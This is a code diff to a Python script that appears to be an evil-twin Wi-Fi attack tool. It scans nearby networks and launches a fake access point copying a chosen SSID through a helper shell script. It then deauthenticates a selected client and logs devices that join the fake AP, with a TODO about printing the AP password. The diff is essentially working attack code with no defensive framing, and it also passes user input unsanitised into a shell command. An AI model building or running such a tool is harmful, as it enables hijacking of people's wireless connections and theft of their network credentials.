@@ -9,6 +9,7 @@ import time
 import pdb
 import os
 from loguru import logger
+from subprocess import run
 
 # initialize the networks dataframe that will contain all access points nearby
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
@@ -17,10 +18,22 @@ networks.set_index("BSSID", inplace=True)
 
 isSniffing = True
 isPrinting = True
+check_fake_ap_connections = True
 
 bssid_to_scan = ''
 clients = set()
 
+# check for connection on the fake ap
+def check_for_connection():
+    conn = []
+    while check_fake_ap_connections:
+        out = run("systemctl status hostapd | grep \"starting accounting session\"", capture_output=True, shell=True, text=True).stdout
+        for line in out.splitlines():
+            client_mac = line.split()[7]
+            if client_mac not in conn:
+                conn.append(client_mac)
+                logger.info(f"{client_mac} Client connected!")
+        time.sleep(1)
 
 def callback(packet):
     if packet.haslayer(Dot11Beacon):
@@ -113,22 +126,26 @@ if __name__ == "__main__":
     ssid_to_scan = input()
     bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]
 
-    logger.info("please insert a wifi interface name for the fake AP: ")
-    fake_ap = input()
-    logger.info("please insert a wifi interface name with working net connection: ")
-    net_ap = input()
-
-
-    os.system(f"./rerouting_magic.sh --ap {fake_ap} --net {net_ap} --ssid {ssid_to_scan}")
-
     logger.info(f'Start scanning clients on {bssid_to_scan}')
     sniff(prn=get_AP_clients, monitor=True, timeout=20)
     isSniffing = False
 
+    
+    os.system(f"./rerouting_magic.sh --ssid {ssid_to_scan}")
+
+    # start the thread that prints all the connected clients
+    printer = Thread(target=check_for_connection)
+    printer.daemon = True
+    printer.start()
+
     logger.info(f"clients connected to the AP you choose: {clients}")
     logger.info("please choose a client MAC to deauth: ")
     target_mac = input()
-
     deauth_target(target_mac, bssid_to_scan)
+
+    check_fake_ap_connections = False
+
+    # TODO: print the ap password
     
+
     pdb.set_trace()
